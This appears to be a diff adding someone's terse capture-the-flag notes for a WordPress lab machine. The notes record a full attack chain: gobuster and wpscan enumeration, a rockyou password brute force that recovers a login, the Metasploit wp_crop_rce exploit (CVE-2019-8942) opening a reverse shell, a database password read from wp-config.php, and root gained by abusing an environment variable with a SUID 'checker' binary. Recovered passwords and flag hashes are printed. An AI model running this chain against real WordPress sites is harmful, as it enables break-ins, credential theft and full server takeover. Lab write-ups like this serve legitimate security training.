@@ -1,0 +1,65 @@
+Date:30/mar/2021
+time:13:33
+
+gobuster dir -u http://10.10.65.190 -w /usr/share/wordlists/dirb/common.txt
+└─$ wpscan --url http://10.10.65.190 -e u 
+└─$ cat users                                                             2 ⚙
+bjoel
+kwheel
+└─$ wpscan --url http://10.10.65.190 -U users -P /usr/share/wordlists/rockyou.txt 
+[SUCCESS] - kwheel / cutiepie1 
+
+https://www.cvedetails.com/cve/CVE-2019-8942/#metasploit
+https://www.rapid7.com/db/modules/exploit/multi/http/wp_crop_rce/
+
+start msfconsoel 
+msf6 > use exploit/multi/http/wp_crop_rce
+msf6 exploit(multi/http/wp_crop_rce) > set RHOSTS 10.10.65.190
+RHOSTS => 10.10.65.190
+msf6 exploit(multi/http/wp_crop_rce) > set LHOST 10.2.65.134
+LHOST => 10.2.65.134
+msf6 exploit(multi/http/wp_crop_rce) > set PASSWORD cutiepie1
+PASSWORD => cutiepie1
+msf6 exploit(multi/http/wp_crop_rce) > set USERNAME kwheel
+USERNAME => kwheel
+msf6 exploit(multi/http/wp_crop_rce) > run
+
+meterpreter > shell
+cat wp-config.php
+found:bjoel
+define('DB_PASSWORD', 'LittleYellowLamp90!@');
+
+meterpreter > shell
+Process 1931 created.
+Channel 4 created.
+echo $path
+
+echo $PATH
+/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
+export admin=admin
+echo $admin
+admin
+cd /usr/sbin
+./checker
+whoami
+root
+cd /root
+cat root.txt
+9a0b2b618bef9bfa7ac28c1353d9f318
+cd media
+/bin/bash: line 4: cd: media: No such file or directory
+cd /
+cd media
+ls -al
+total 12
+drwxr-xr-x  3 root  root  4096 May 26  2020 .
+drwxr-xr-x 24 root  root  4096 May 25  2020 ..
+drwx------  2 bjoel bjoel 4096 May 28  2020 usb
+cd usb
+ls -al
+total 12
+drwx------ 2 bjoel bjoel 4096 May 28  2020 .
+drwxr-xr-x 3 root  root  4096 May 26  2020 ..
+-rw-r----- 1 bjoel bjoel   33 May 28  2020 user.txt
+cat user.txt
+c8421899aae571f7af486492b71a8ab7
